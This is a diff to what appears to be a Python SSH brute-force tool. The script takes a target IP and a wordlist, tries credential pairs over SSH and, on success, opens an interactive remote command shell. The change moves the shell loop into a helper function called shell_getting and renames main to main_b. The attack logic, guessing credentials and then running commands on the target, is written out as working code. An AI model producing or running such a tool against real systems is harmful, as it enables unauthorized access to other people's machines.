@@ -7,7 +7,7 @@ import time
 from ssh_connect import *
 
 
-def main():
+def main_b():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("ip", help="Specify Target ip")
 	parser.add_argument("file1", help="Specify Wordlist")
@@ -31,29 +31,11 @@ def main():
 
 						conn = connect(args.ip, user, passwd) # ssh connect
 
-						if conn:
 
-							totalTime = time.time() - startTime
-							totalTime = '%.3f'%totalTime
+						# Getting shell after connecting to ssh 
+						shell_getting(user, args.ip, conn, startTime)
 
-							print(color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color_obj.ENDC)
 
-							print(color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
-							'''+color_obj.ENDC)
-							
-							command = input(user+'@'+args.ip+':$ ')
-
-							while command != 'exit':
-								conn.sendline(command)
-								conn.prompt()
-								print(conn.before.decode("utf-8"))
-								command = input(user+'@'+args.ip+':$ ')
-
-							else:
-								print(color_obj.YEL+'''
-Bye!
-							'''+color_obj.ENDC)
-								exit(0)
 	else:
 			print(parser.usage)
 			exit(0)
@@ -61,5 +43,5 @@ Bye!
 
 if __name__ == '__main__':
 	
-	main()
+	main_b()
 
